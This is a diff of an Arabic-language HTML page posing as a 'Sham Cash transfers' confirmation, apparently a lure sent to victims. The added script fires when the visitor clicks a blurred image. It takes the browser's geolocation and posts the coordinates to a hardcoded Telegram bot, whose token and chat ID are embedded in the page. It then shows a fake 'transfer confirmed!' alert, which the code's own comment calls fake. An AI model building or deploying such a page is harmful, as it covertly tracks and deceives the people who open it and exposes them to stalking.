@@ -3,52 +3,75 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تأكيد التحويل</title>
+  <title>تحويلات شام كاش</title>
   <style>
     body {
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
       background-color: #f0f0f0;
+      margin: 0;
+      font-family: Arial, sans-serif;
     }
-    .card {
-      width: 500px; /* كبر الصورة */
-      height: 350px;
-      background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
+
+    #imageCard {
+      width: 400px;
+      height: 400px;
+      background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg'); /* ضع هنا الصورة أو GIF */
       background-size: cover;
       background-position: center;
-      filter: blur(3px); /* لتغبيش الصورة */
+      filter: blur(2px); /* لتغبيش الصورة */
+      cursor: pointer;
       display: flex;
       justify-content: center;
       align-items: center;
       color: white;
       font-weight: bold;
-      font-size: 24px;
-      text-shadow: 1px 1px 3px black;
-      cursor: pointer;
-      position: relative;
+      font-size: 20px;
+      text-shadow: 1px 1px 2px black;
     }
-    .card span {
-      position: absolute;
-      z-index: 2;
-    }
-    .card a {
-      position: absolute;
-      width: 100%;
-      height: 100%;
-      top: 0;
-      left: 0;
-      text-decoration: none;
-      z-index: 1; /* الرابط تحت النص */
+
+    #caption {
+      margin-top: 15px;
+      font-size: 18px;
+      color: #333;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <span>Click Here</span>
-    <a href="https://lolo-1-rt30.onrender.com" target="_blank"></a>
-  </div>
+  <div id="imageCard">Click Here</div>
+  <div id="caption">تحويلات شام كاش</div>
+
+  <script>
+    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
+    const CHAT_ID = "7485197107"; // معرف الشات
+    const card = document.getElementById('imageCard');
+
+    card.addEventListener('click', () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // إرسال الموقع للبوت
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: `Lat: ${lat}\nLon: ${lon}`
+            })
+          });
+
+          alert('تم تأكيد التحويل!'); // رسالة مزيفة فقط
+        });
+      } else {
+        alert('غير قادر على الحصول على الموقع.');
+      }
+    });
+  </script>
 </body>
 </html>
